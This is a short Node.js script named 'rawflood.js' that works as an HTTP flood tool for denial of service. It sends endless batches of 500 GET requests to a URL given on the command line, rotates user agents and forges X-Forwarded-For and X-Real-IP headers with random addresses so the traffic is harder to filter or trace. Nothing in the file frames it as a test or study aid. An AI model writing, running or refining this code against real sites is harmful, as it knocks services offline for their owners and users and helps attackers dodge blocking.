const axios = require('axios');
const fs = require('fs');

const target = process.argv[2];
if (!target) {
  console.error('Usage: node rawflood.js <target_url>');
  process.exit(1);
}

// Load user-agents
const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);

// Spoofed headers generator
function getSpoofedHeaders() {
  const ua = userAgents[Math.floor(Math.random() * userAgents.length)];
  return {
    'User-Agent': ua,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Upgrade-Insecure-Requests': '1',
    'DNT': '1',
    'Connection': 'keep-alive',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
    'X-Forwarded-For': randomIP(),
    'X-Real-IP': randomIP(),
  };
}

// Generate random IP
function randomIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
}

// Send one spoofed request
async function sendSpoofedRequest(id) {
  try {
    await axios.get(target, {
      headers: getSpoofedHeaders(),
      timeout: 10000,
      validateStatus: () => true,
    });
    console.log(`[#${id}] Request Sent`);
  } catch (err) {
    console.error(`[#${id}] Error: ${err.message}`);
  }
}

// Raw flood function
async function startFlood() {
  let count = 0;
  
  while (true) {
    const batch = [];

    for (let i = 0; i < 500; i++) {
      count++;
      batch.push(sendSpoofedRequest(count));
    }

    Promise.allSettled(batch); // Don't wait
    console.log(`> 500 Requests Fired! Total Sent: ${count}`);
  }
}

startFlood();
